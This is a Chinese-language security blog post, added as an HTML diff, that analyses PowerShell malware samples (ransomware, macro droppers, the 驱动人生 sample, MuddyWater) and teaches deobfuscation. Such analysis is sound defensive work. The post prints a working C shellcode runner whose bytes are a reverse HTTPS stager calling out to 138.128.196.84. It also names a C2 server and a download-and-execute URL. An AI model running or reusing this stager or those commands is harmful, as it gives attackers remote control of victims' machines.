@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="findream's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x1 常见混淆 基于大小写 ：hacky—&amp;gt;HaCky 基于字符分割：’Ha’+’Cky’—&amp;gt;HaCky 插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&amp;gt;HaCky 反引号：H`aCky—&amp;gt;HaCky 基于命令转换(字符串转化为命令)&amp;amp;(HaCky)—&amp;gt;HaCky 基于空格或者ASCII">
+<meta property="og:type" content="article">
+<meta property="og:title" content="样本分析之Powershell">
+<meta property="og:url" content="https://findream.github.io/2019/07/01/病毒分析技术_22_样本分析之Powershell/index.html">
+<meta property="og:site_name" content="findream&#39;s blog">
+<meta property="og:description" content="0x1 常见混淆 基于大小写 ：hacky—&amp;gt;HaCky 基于字符分割：’Ha’+’Cky’—&amp;gt;HaCky 插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&amp;gt;HaCky 反引号：H`aCky—&amp;gt;HaCky 基于命令转换(字符串转化为命令)&amp;amp;(HaCky)—&amp;gt;HaCky 基于空格或者ASCII">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://hacky.wang/blog/20190629/XqfP84ygBUqt.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190626/0rstQItBCLi5.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190629/E7015YVIThF9.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190629/3aIiKnEUJr3L.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190629/7Vgnc0a8TVuQ.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190629/uGmvm4Po1BuL.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190629/FHPzGfssxIKj.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/VeyL8BeISw6L.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/wSkhC9d67Mov.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/vJFQ2KIScfM7.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/fL2aSJsYt7ji.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/t1apT8b88QMv.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/A54OqRKnUsb5.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/TQwrMYnI3PTA.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/DiUEHuv5jyi3.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/f2lDuttR3tLb.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/s9EkB4Ft4FKO.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20190823/6RKHcQLhjEIj.png?imageslim">
+<meta property="og:updated_time" content="2019-08-23T08:46:24.764Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="样本分析之Powershell">
+<meta name="twitter:description" content="0x1 常见混淆 基于大小写 ：hacky—&amp;gt;HaCky 基于字符分割：’Ha’+’Cky’—&amp;gt;HaCky 插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&amp;gt;HaCky 反引号：H`aCky—&amp;gt;HaCky 基于命令转换(字符串转化为命令)&amp;amp;(HaCky)—&amp;gt;HaCky 基于空格或者ASCII">
+<meta name="twitter:image" content="http://hacky.wang/blog/20190629/XqfP84ygBUqt.png?imageslim">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findream.github.io/2019/07/01/病毒分析技术_22_样本分析之Powershell/"/>
+
+
+
+
+
+  <title>样本分析之Powershell | findream's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">findream's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2019/07/01/病毒分析技术_22_样本分析之Powershell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findream">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="findream's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">样本分析之Powershell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-01T15:02:11+08:00">
+                2019-07-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/windows系统/" itemprop="url" rel="index">
+                    <span itemprop="name">windows系统</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x1-常见混淆"><a href="#0x1-常见混淆" class="headerlink" title="0x1 常见混淆"></a>0x1 常见混淆</h1><ul>
+<li>基于大小写 ：hacky—&gt;HaCky</li>
+<li>基于字符分割：’Ha’+’Cky’—&gt;HaCky</li>
+<li>插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&gt;HaCky</li>
+<li>反引号：H`aCky—&gt;HaCky</li>
+<li>基于命令转换(字符串转化为命令)&amp;(HaCky)—&gt;HaCky</li>
+<li>基于空格或者ASCII<a id="more"></a>
+</li>
+</ul>
+<h1 id="0x2-勒索软件"><a href="#0x2-勒索软件" class="headerlink" title="0x2 勒索软件"></a>0x2 勒索软件</h1><ul>
+<li>解混淆能清除发现是AES加密<br>  <img src="http://hacky.wang/blog/20190629/XqfP84ygBUqt.png?imageslim" alt="mark"></li>
+</ul>
+<h1 id="0x3-流量欺骗"><a href="#0x3-流量欺骗" class="headerlink" title="0x3 流量欺骗"></a>0x3 流量欺骗</h1><ul>
+<li>1.宏病毒释放处宏代码，如文件macro.vbs，查看宏代码，发现一段base64编码之后的数据，然后调用powershell执行，怀疑是一个powershell脚本</li>
+<li>2.通过解base得到一个ps1脚本代码，命名为ByPowershell.ps1</li>
+<li>3.通过分析，可以发现ByPowershell.ps1，利用powershell执行了一次-nop -noni -enc 命令，目的在于隐秘执行<br>  <img src="http://hacky.wang/blog/20190626/0rstQItBCLi5.png?imageslim" alt="mark"></li>
+<li>4.解base64编码，得到FromPowershell.ps1_,可以观察到是利用利用virtuallAlloc执行shellcode</li>
+<li>如果发现ps1脚本里面有shellcode，只需要用C语言内联shellcode字节，然后调试即可。如下是shellcode利用脚本<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	printf(<span class="string">"hhhhh\n"</span>);</div><div class="line">	<span class="keyword">char</span> shellcode[] = &#123;<span class="string">'\xfc'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x82'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x60'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe5'</span>,<span class="string">'\x31'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x64'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x50'</span>,<span class="string">'\x30'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x0c'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x14'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x72'</span>,<span class="string">'\x28'</span>,<span class="string">'\x0f'</span>,<span class="string">'\xb7'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x26'</span>,<span class="string">'\x31'</span>,<span class="string">'\xff'</span>,<span class="string">'\xac'</span>,<span class="string">'\x3c'</span>,<span class="string">'\x61'</span>,<span class="string">'\x7c'</span>,<span class="string">'\x02'</span>,<span class="string">'\x2c'</span>,<span class="string">'\x20'</span>,<span class="string">'\xc1'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x0d'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc7'</span>,<span class="string">'\xe2'</span>,<span class="string">'\xf2'</span>,<span class="string">'\x52'</span>,<span class="string">'\x57'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x10'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x3c'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x11'</span>,<span class="string">'\x78'</span>,<span class="string">'\xe3'</span>,<span class="string">'\x48'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd1'</span>,<span class="string">'\x51'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x59'</span>,<span class="string">'\x20'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x49'</span>,<span class="string">'\x18'</span>,<span class="string">'\xe3'</span>,<span class="string">'\x3a'</span>,<span class="string">'\x49'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x34'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd6'</span>,<span class="string">'\x31'</span>,<span class="string">'\xff'</span>,<span class="string">'\xac'</span>,<span class="string">'\xc1'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x0d'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc7'</span>,<span class="string">'\x38'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x75'</span>,<span class="string">'\xf6'</span>,<span class="string">'\x03'</span>,<span class="string">'\x7d'</span>,<span class="string">'\xf8'</span>,<span class="string">'\x3b'</span>,<span class="string">'\x7d'</span>,<span class="string">'\x24'</span>,<span class="string">'\x75'</span>,<span class="string">'\xe4'</span>,<span class="string">'\x58'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x58'</span>,<span class="string">'\x24'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x66'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x0c'</span>,<span class="string">'\x4b'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x58'</span>,<span class="string">'\x1c'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x04'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd0'</span>,<span class="string">'\x89'</span>,<span class="string">'\x44'</span>,<span class="string">'\x24'</span>,<span class="string">'\x24'</span>,<span class="string">'\x5b'</span>,<span class="string">'\x5b'</span>,<span class="string">'\x61'</span>,<span class="string">'\x59'</span>,<span class="string">'\x5a'</span>,<span class="string">'\x51'</span>,<span class="string">'\xff'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x5a'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x12'</span>,<span class="string">'\xeb'</span>,<span class="string">'\x8d'</span>,<span class="string">'\x5d'</span>,<span class="string">'\x68'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x65'</span>,<span class="string">'\x74'</span>,<span class="string">'\x00'</span>,<span class="string">'\x68'</span>,<span class="string">'\x77'</span>,<span class="string">'\x69'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x69'</span>,<span class="string">'\x54'</span>,<span class="string">'\x68'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x77'</span>,<span class="string">'\x26'</span>,<span class="string">'\x07'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x31'</span>,<span class="string">'\xdb'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x3a'</span>,<span class="string">'\x56'</span>,<span class="string">'\x79'</span>,<span class="string">'\xa7'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x03'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\xbb'</span>,<span class="string">'\x01'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\xe8'</span>,<span class="string">'\xa7'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x2f'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x37'</span>,<span class="string">'\x6c'</span>,<span class="string">'\x37'</span>,<span class="string">'\x46'</span>,<span class="string">'\x38'</span>,<span class="string">'\x51'</span>,<span class="string">'\x73'</span>,<span class="string">'\x64'</span>,<span class="string">'\x71'</span>,<span class="string">'\x4f'</span>,<span class="string">'\x68'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x36'</span>,<span class="string">'\x43'</span>,<span class="string">'\x53'</span>,<span class="string">'\x39'</span>,<span class="string">'\x32'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x35'</span>,<span class="string">'\x41'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x58'</span>,<span class="string">'\x57'</span>,<span class="string">'\x54'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x70'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x75'</span>,<span class="string">'\x4d'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x66'</span>,<span class="string">'\x48'</span>,<span class="string">'\x00'</span>,<span class="string">'\x50'</span>,<span class="string">'\x68'</span>,<span class="string">'\x57'</span>,<span class="string">'\x89'</span>,<span class="string">'\x9f'</span>,<span class="string">'\xc6'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x89'</span>,<span class="string">'\xc6'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x32'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x84'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x57'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\xeb'</span>,<span class="string">'\x55'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x3b'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x96'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x0a'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x68'</span>,<span class="string">'\x80'</span>,<span class="string">'\x33'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x04'</span>,<span class="string">'\x50'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x1f'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x75'</span>,<span class="string">'\x46'</span>,<span class="string">'\x9e'</span>,<span class="string">'\x86'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x2d'</span>,<span class="string">'\x06'</span>,<span class="string">'\x18'</span>,<span class="string">'\x7b'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x75'</span>,<span class="string">'\x08'</span>,<span class="string">'\x4f'</span>,<span class="string">'\x75'</span>,<span class="string">'\xd9'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x4b'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x40'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x10'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x40'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x58'</span>,<span class="string">'\xa4'</span>,<span class="string">'\x53'</span>,<span class="string">'\xe5'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x93'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe7'</span>,<span class="string">'\x57'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x20'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x12'</span>,<span class="string">'\x96'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe2'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x74'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x07'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc3'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x75'</span>,<span class="string">'\xe5'</span>,<span class="string">'\x58'</span>,<span class="string">'\xc3'</span>,<span class="string">'\x5f'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x77'</span>,<span class="string">'\xff'</span>,<span class="string">'\xff'</span>,<span class="string">'\xff'</span>,<span class="string">'\x31'</span>,<span class="string">'\x33'</span>,<span class="string">'\x38'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x31'</span>,<span class="string">'\x32'</span>,<span class="string">'\x38'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x31'</span>,<span class="string">'\x39'</span>,<span class="string">'\x36'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x38'</span>,<span class="string">'\x34'</span>,<span class="string">'\x00'</span>,<span class="string">'\xbb'</span>,<span class="string">'\xf0'</span>,<span class="string">'\xb5'</span>,<span class="string">'\xa2'</span>,<span class="string">'\x56'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>&#125;;</div><div class="line">	DWORD oldProtect = <span class="number">0</span>;</div><div class="line">	VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE,&amp;oldProtect);</div><div class="line">	((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))&amp;shellcode)();</div><div class="line">	VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), oldProtect, &amp;oldProtect);</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="0x4-驱动人生样本"><a href="#0x4-驱动人生样本" class="headerlink" title="0x4 驱动人生样本"></a>0x4 驱动人生样本</h1><ul>
+<li>1.得到样本g123.ps1，<code>Invoke-Expression</code>是一个可以将变量(字符串)当成可以执行的语句。正常情况下如果有此语句是不能显示代码语句的，但是我们可以使用<code>Write-Host</code>打印代码。在powershell中执行g123.ps1。可以发现代码被严重混淆。将其重定向输出成1.ps1即可<br>  <img src="http://hacky.wang/blog/20190629/E7015YVIThF9.png?imageslim" alt="mark"></li>
+<li>2.但是仍然发现代码被混淆严重，但是可以发现代码的一些蛛丝马迹。看代码最后一行。它其中是以. (表达式)(表达式)来执行的。可以联想到Invoke-Expression。看到在&amp; ((GV ‘<em>mDr</em>‘).nAME[3,11,2]-joiN’’)之前有个管道符。使用<code>Out-File .\tmp.log</code>重定向即可。得到2.ps1<br>  <img src="http://hacky.wang/blog/20190629/3aIiKnEUJr3L.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190629/7Vgnc0a8TVuQ.png?imageslim" alt="mark"></li>
+<li>2.ps1和1.ps1是一样的。使用<code>Out-File .\tmp.log</code>解决，得到3.ps1.</li>
+<li>3.3.ps1换了一种混淆方式，但是处理是一样的。 <code>($sHELLiD[1]+$ShelLiD[13]+&#39;X&#39;)</code>可以猜测是IEX。解混淆得到4.ps1.<br>  <img src="http://hacky.wang/blog/20190629/uGmvm4Po1BuL.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190629/FHPzGfssxIKj.png?imageslim" alt="mark"><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2></li>
+<li>遇到混淆了的powershell，除了常规的字符替换之类的方法，还有三种方法可以解混淆。<ul>
+<li>1.遇上Base64加密的，可以将<code>Invoke-Expression</code>修改为<code>Write-Host</code>即可。</li>
+<li>2.出现在结尾的IEX字段，这时候，可以利用输出重定向，使用<code>Out-File .\tmp.log</code>.<strong>重点是查看是否有管道符</strong></li>
+<li>3.出现在起始部分IEX字段，例如<code>. ( $EnV:CoMsPec[4,26,25]-JoIN&#39;&#39;)(((&#39;[string]3CHav = U&#39;+&#39;ABUAB[string]....</code>。只需要修改语句为<code>Write-Host</code>即可。</li>
+</ul>
+</li>
+<li>备注：解混淆需要活学活用。重点是寻找<code>Invoke-Expression</code>字段</li>
+<li>参考：<a href="https://paper.seebug.org/826/" target="_blank" rel="external">https://paper.seebug.org/826/</a></li>
+</ul>
+<h1 id="0x5-MuddyWater样本"><a href="#0x5-MuddyWater样本" class="headerlink" title="0x5 MuddyWater样本"></a>0x5 MuddyWater样本</h1><ul>
+<li>得到的样本属于宏病毒，通过对vb代码的分析，发现样本会向%tmp释放aulngr.vbe。并设置开机自启。<br>  <img src="http://hacky.wang/blog/20190823/VeyL8BeISw6L.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190823/wSkhC9d67Mov.png?imageslim" alt="mark"></li>
+<li><p>将得到的vbe文件有Decode VBE解密。<a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/decode-vbe.py" target="_blank" rel="external">https://github.com/DidierStevens/DidierStevensSuite/blob/master/decode-vbe.py</a><br>  <img src="http://hacky.wang/blog/20190823/vJFQ2KIScfM7.png?imageslim" alt="mark"></p>
+</li>
+<li><p>可以看出进行了Base64解密，然后将其写入UserImage.png文件，然后调用Powershell执行<br>  <img src="http://hacky.wang/blog/20190823/fL2aSJsYt7ji.png?imageslim" alt="mark"></p>
+</li>
+<li>将经过Base64加密的数据进行解密，得到一个解密的ps1脚本。<br>  <img src="http://hacky.wang/blog/20190823/t1apT8b88QMv.png?imageslim" alt="mark"></li>
+<li>进过分析，发现主要执行了一下操作：<ul>
+<li>1.获取系统基本信息：进程，系统名称，用户名称，GUID，并存储值log.txt和fl.txt并发送给C2:185.185.25.175<br><img src="http://hacky.wang/blog/20190823/A54OqRKnUsb5.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20190823/TQwrMYnI3PTA.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20190823/DiUEHuv5jyi3.png?imageslim" alt="mark"></li>
+<li>2.<a href="http://185.185.25.175/sDownloads/下载ieee.dat到C:\Users\Public\GUID.JPRG，然后利用Powershell执行" target="_blank" rel="external">http://185.185.25.175/sDownloads/下载ieee.dat到C:\Users\Public\GUID.JPRG，然后利用Powershell执行</a><br><img src="http://hacky.wang/blog/20190823/f2lDuttR3tLb.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20190823/s9EkB4Ft4FKO.png?imageslim" alt="mark"></li>
+</ul>
+</li>
+<li>经过对ieee.dat的分析，发现其是一个后门，不做具体分析</li>
+<li>攻击链如下：<br>  <img src="http://hacky.wang/blog/20190823/6RKHcQLhjEIj.png?imageslim" alt="mark"></li>
